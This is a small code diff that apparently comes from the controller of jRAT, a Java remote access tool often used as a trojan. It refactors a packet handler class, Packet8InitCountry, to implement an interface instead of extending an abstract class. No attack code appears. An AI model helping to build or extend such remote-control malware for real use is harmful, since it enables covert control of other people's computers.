@@ -3,7 +3,7 @@ package jrat.controller.packets.incoming;
 import jrat.controller.Slave;
 import jrat.controller.settings.Settings;
 
-public class Packet8InitCountry extends AbstractIncomingPacket {
+public class Packet8InitCountry implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
